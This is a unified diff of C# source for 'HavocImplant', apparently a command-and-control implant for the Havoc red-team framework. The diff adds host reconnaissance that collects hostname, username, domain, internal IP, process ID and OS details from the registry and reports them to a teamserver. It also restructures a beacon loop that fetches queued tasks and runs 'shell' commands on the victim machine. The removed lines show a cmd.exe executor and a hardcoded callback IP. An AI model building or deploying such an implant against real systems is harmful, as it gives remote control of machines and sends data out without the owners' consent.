@@ -5,75 +5,105 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Net.Http;
 using System.Net;
-using System.Collections; 
+using System.Collections;
 using System.IO;
 using System.Diagnostics;
 using System.Threading;
 using System.Text.RegularExpressions;
+using Microsoft.Win32;
+using System.Security.Cryptography;
+using System.Management;
+
 namespace HavocImplant
 {
+    // The Core Class for the implant. Without AgentFunctions/, it can only exit and communicate with the server.
     public class Implant
     {
+        // Altered by build
+        string url = Config.url;
+        int sleepTime = Config.sleepTime;
+
+        // Communication with Teamserver
         byte[] id;
-        string url = "http://192.168.179.130:80/";
-        bool registered = false;
-        int sleepTime = 3000;
+        byte[] magic;
+        bool registered;
+        public string outputData = "";
+
+        // Registration Properties
+        string hostname = Dns.GetHostName();
+        string userName = Environment.UserName;
+        string domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
+        string IP = getIPv4();
+        string PID = Process.GetCurrentProcess().Id.ToString();
+        string PPID = "ppid here";
+        string osBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
+        string osArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
+        string processName = Process.GetCurrentProcess().ProcessName;
+        string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
+
         static void Main(string[] args)
         {
-            bool isnull(byte b)
-            {
-                return (b == 0x00);
-            }
             Implant implant = new Implant();
             while (!implant.registered) implant.Register();
-            string outputData = "";
             while (true)
             {
-                string commands = implant.CheckIn(outputData);
-                outputData = "";
+                string commands = implant.CheckIn(implant.outputData);
+                implant.outputData = "";
                 if (commands.Length > 4)
                 {
-                    commands = commands.Substring(4);
-                    List<byte> bruh = Encoding.UTF8.GetBytes(commands).ToList<byte>();
-                    bruh.RemoveAll(isnull);
-                    commands = Encoding.UTF8.GetString(bruh.ToArray());
-                    
-                    string[] commandsArray = commands.Split(null);
+                    string[] commandsArray = commands.Split(new string[] { commands.Substring(0, 4) }, StringSplitOptions.RemoveEmptyEntries);
+                    Console.WriteLine("Command Queue length: {0}", commandsArray.Length);
                     foreach (string command in commandsArray)
                     {
                         Console.WriteLine("Read command: {0}", command);
-                        outputData += implant.runCommand(command);
+
+                        List<byte> commandBytes = Encoding.UTF8.GetBytes(command.Split(' ')[0]).ToList();
+                        commandBytes.Remove(0x00);
+                        Console.WriteLine("Length is: {0}", Encoding.UTF8.GetString(commandBytes.ToArray()).Length);
+                        string sanitizedCommand = Encoding.UTF8.GetString(commandBytes.ToArray());
+                        switch (sanitizedCommand.Split(' ')[0])
+                        {
+                            case "shell":
+                                Thread childThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5)));
+                                childThread.Start();
+                                break;
+                            //outputData += implant.runCommand(command.Substring(5)).Replace("\\", "\\\\"); break; // Parse the shell command after the "shell"
+                            case "goodbye":
+                                Console.WriteLine("It is die time my dudes"); Environment.Exit(0); break;
+                        }
+                        //Console.WriteLine("Output Data: {0}", outputData);
                     }
                 }
                 Thread.Sleep(implant.sleepTime);
             }
-            //Console.WriteLine(implant.runCommand("whoami /all"));
         }
         public void Register()
         {
-            byte[] magic = new byte[] { 0x41, 0x41, 0x41, 0x41 };
+            magic = new byte[] { 0x41, 0x41, 0x41, 0x42 };
             id = Encoding.ASCII.GetBytes(random_id().ToString());
 
             string registrationRequestBody = obtainRegisterDict(Int32.Parse(Encoding.ASCII.GetString(id)));
             byte[] agentHeader = createHeader(magic, registrationRequestBody);
-            while (!sendReq(registrationRequestBody, agentHeader).Equals("registered"))
-            { 
-                Console.WriteLine("Trying to register"); 
-                Thread.Sleep(sleepTime); 
+
+            string response = "";
+            while (!response.Equals("registered"))
+            {
+                Console.WriteLine("Trying to register");
+                response = sendReq(registrationRequestBody, agentHeader);
+                Console.WriteLine("Response: {0}", response);
+                Thread.Sleep(sleepTime);
             }
             registered = true;
         }
         public string CheckIn(string data)
         {
-            Console.WriteLine("Checking in for taskings");
-            
-            byte[] magic = new byte[] { 0x41, 0x41, 0x41, 0x41 };
+            //Console.WriteLine("Checking in for taskings");
 
             string checkInRequestBody = "{\"task\": \"gettask\", \"data\": \"{0}\"}".Replace("{0}", Regex.Replace(data, @"\r\n?|\n|\n\r", "\\n"));
             //string checkInRequestBody = "{\"task\":\"gettask\",\"data\":\"{0}\"}".Replace("{0}", BitConverter.ToString(data));
             byte[] agentHeader = createHeader(magic, checkInRequestBody);
             string response = sendReq(checkInRequestBody, agentHeader);
-            Console.WriteLine("Havoc Response: {0}".Replace("{0}", response));
+            //Console.WriteLine("Havoc Response: {0}".Replace("{0}", response));
             return response;
 
         }
@@ -101,24 +131,24 @@ namespace HavocImplant
             int id = rand.Next(1000, 10000);
             return id;
         }
-        string obtainRegisterDict(int id) 
+        string obtainRegisterDict(int id)
         {
             Dictionary<string, string> registrationAttrs = new Dictionary<string, string>();
             registrationAttrs.Add("AgentID", id.ToString());
-            registrationAttrs.Add("Hostname", "hostname here");
-            registrationAttrs.Add("Username", "username here");
-            registrationAttrs.Add("Domain", "domain here");
-            registrationAttrs.Add("InternalIP", "need an internal ip");
+            registrationAttrs.Add("Hostname", hostname);
+            registrationAttrs.Add("Username", userName);
+            registrationAttrs.Add("Domain", domainName);
+            registrationAttrs.Add("InternalIP", IP);
             registrationAttrs.Add("Process Path", "process path here");
-            registrationAttrs.Add("Process ID", "pid here");
-            registrationAttrs.Add("Process Parent ID", "ppid here");
+            registrationAttrs.Add("Process ID", PID);
+            registrationAttrs.Add("Process Parent ID", PPID);
             registrationAttrs.Add("Process Arch", "x64");
             registrationAttrs.Add("Process Elevated", "elevated status here");
-            registrationAttrs.Add("OS Build", "os build here");
-            registrationAttrs.Add("OS Arch", "os arch here");
-            registrationAttrs.Add("Sleep", 1.ToString());
-            registrationAttrs.Add("Process Name", "process name here");
-            registrationAttrs.Add("OS Version", "os verison here");
+            registrationAttrs.Add("OS Build", osBuild);
+            registrationAttrs.Add("OS Arch", osArch);
+            registrationAttrs.Add("Sleep", (sleepTime / 1000).ToString());
+            registrationAttrs.Add("Process Name", processName);
+            registrationAttrs.Add("OS Version", osVersion);
             string strRegistrationAttrsAsJSON = stringDictionaryToJson(registrationAttrs);
             string strPostReq = "{\"task\": \"register\", \"data\": \"{0}\"}".Replace("{0}", strRegistrationAttrsAsJSON);
             return strPostReq;
@@ -168,27 +198,20 @@ namespace HavocImplant
             }
             return responseString;
         }
-        public string runCommand(string command)
+        static string getIPv4()
         {
-            if (command.Equals("goodbye")) Environment.Exit(0);
+            foreach (var a in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
+                if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                    return a.ToString();
+            return "";
 
-            string output = "";
-            Console.WriteLine("Running cmd.exe /c " + command);
-            Process process = new Process();
-            process.StartInfo.FileName = "cmd.exe";
-            process.StartInfo.Arguments = "/c " +  command;
-            process.StartInfo.UseShellExecute = false;
-            process.StartInfo.RedirectStandardOutput = true;
-            process.StartInfo.RedirectStandardError = true;
-            process.OutputDataReceived += (sender, args) => output += args.Data + Environment.NewLine;
-            process.ErrorDataReceived += (sender, args) => output += args.Data + Environment.NewLine;
-            process.Start();
-            process.BeginErrorReadLine();
-            process.BeginOutputReadLine();
+        }
 
-            process.WaitForExit();
-            Console.WriteLine("output: {0}", output);
-            return output;
+        public static string HKLM_GetString(string path, string key)
+        {
+            RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
+            if (rk == null) return "";
+            return (string)rk.GetValue(key);
         }
     }
 }
